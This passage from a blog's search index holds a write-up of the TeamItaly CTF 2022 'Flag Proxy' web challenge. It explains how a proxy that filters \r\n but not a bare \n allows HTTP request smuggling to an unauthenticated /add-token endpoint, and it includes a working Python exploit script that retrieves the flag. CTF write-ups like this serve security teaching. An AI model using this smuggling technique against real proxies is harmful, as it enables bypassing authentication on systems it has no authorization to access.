challenge is based on a Node.js web application powered by Express.js. Two endpoints are provided:\n/flag: Returns the flag when accessed with a valid token. /add-token: Adds a token to the backend\u0026rsquo;s allowed list if the correct auth secret is provided. To retrieve the flag, the client must send a request to /flag with a query parameter ?token. This token is then passed as the Authorization header to the backend, and it must match one of the values in the tokens[] array. New tokens can be added via the /add-token endpoint by providing:\n?token: the token to add. ?auth: an authentication parameter. At first glance, the challenge appears secure. However, we see that in the frontend proxy server, http-client.js, on line 55-58 it blocks headers containing \\r\\n to prevent HTTP Request Smuggling. However, it fails to sanitize standalone \\n characters.\nThis allows smuggling requests via \\n line endings in the Authorization header. Moreover, the backend\u0026rsquo;s /add-token endpoint does not enforce the auth parameter check when accessed directly. Thus, smuggling a request to this endpoint allows adding arbitrary tokens without the secret.\nIt\u0026rsquo;s working! Now, lets smuggle another request to the /add-token endpoint with an arbitrary token, to be able to write our token inside tokens[] array, successfully bypassing frontend proxy server checks, and later getting the flag:\nimport requests url = \u0026#34;http://flag-proxy.challs.teamitaly.eu/flag\u0026#34; token = \u0026#34;httpsmugglingiscool\u0026#34; smuggle = f\u0026#34;SMUGGLE\\nContent-Length: 0\\nConnection: keep-alive\\n\\nGET /add-token?token={token} HTTP/1.0\u0026#34; req1 = requests.get(url, params={\u0026#34;token\u0026#34;: smuggle}) #print(req1.text) req2 = requests.get(url, params={\u0026#39;token\u0026#39;: token}) print(req2.json()[\u0026#39;body\u0026#39;]) Flag: flag{sanity_check}\n","date":"8 September 2022","externalUrl":null,"permalink":"/posts/teamitaly-ctf/flag-proxy/","section":"Blog","summary":"Writeup for Flag Proxy web challenge of TeamItaly CTF 2022","title":"TeamItaly CTF 2022 - Flag Proxy","type":"posts"},{"content":"","externalUrl":null,"permalink":"/about/","section":"","summary":"","title":"","type":"page"},{"content":"","externalUrl":null,"permalink":"/projects/","section":"","summary":"","title":"","type":"projects"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/events/","section":"Events","summary":"","title":"Events","type":"events"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]